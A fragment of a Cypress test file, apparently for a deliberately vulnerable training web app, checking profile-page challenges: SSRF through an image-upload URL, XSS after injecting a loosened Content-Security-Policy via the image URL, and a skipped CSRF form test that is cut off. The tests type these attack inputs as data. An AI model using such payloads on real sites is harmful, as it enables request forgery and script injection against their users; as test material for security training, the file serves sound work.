...
describe('/profile', () => {
    ...
    describe('challenge "ssrf"', () => {
        it('should be possible to request internal resources using image upload URL', () => {
            cy.visit('/profile');
            cy.get('#url').type(`${Cypress.env('baseUrl')}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`);
        ...
        it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
            cy.task('disableOnContainerEnv').then((disableOnContainerEnv) => {
                if (!disableOnContainerEnv) {
                    cy.visit('/profile');
                    cy.get('#url').type("https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com");
                    cy.get('#submitUrl').click();
                    ...
                    cy.get('#submit').click();
                    cy.get('#url').type(`${Cypress.env('baseUrl')}/assets/public/images/uploads/default.svg`);
                    cy.get('#submitUrl').click();
                    cy.visit('/#/');
        ...
        xit('should be possible to perform a CSRF attack against the user profile page', () => {
            ...
            cy.window().then(() => {
                document
                    ...
                    .contentDocument.getElementsByName('ta')[0].value = `<form action=\\"${Cypress.env('baseUrl')}/profile\\" 
        method=\\"POST\\">
